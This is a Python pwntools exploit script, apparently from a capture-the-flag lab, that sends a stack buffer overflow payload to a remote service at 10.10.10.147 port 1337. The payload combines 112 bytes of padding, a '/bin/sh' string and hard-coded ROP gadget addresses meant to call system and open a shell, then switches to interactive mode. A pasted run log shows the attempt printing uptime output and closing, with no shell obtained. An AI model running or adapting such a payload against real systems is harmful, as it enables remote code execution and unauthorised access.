#!/usr/bin/python3

from pwn import *

# context(terminal=["tmux", "new-window"])
# context(os="linux", arch="amd64")

p = remote("10.10.10.147", 1337)
offset = b"A"*112
cmd = b"/bin/sh\x00"


pop_13 = p64(0x401206)
test = p64(0x401152)
system_call = p64(0x401040)
null_bytes = p64(0x0)
payload = offset + cmd + pop_13 + system_call + null_bytes + null_bytes + test 


p.sendline(payload)
p.interactive()
# rdi -> 0x402008:"/usr/bin/uptime"
# the order to call from a binary
# rdi, rsi, rdx, rcx, r8, r9


"""
[*] Closed connection to 10.10.10.147 port 1337
[*] Got EOF while sending in interactive
‚ùØ python3 buffer-overflow.py
[+] Opening connection to 10.10.10.147 on port 1337: Done
[*] Switching to interactive mode
 14:37:05 up 14:26,  0 users,  load average: 0.02, 0.03, 0.00
[*] Got EOF while reading in interactive
$ whoami
$ id
[*] Closed connection to 10.10.10.147 port 1337
[*] Got EOF while sending in interactive

"""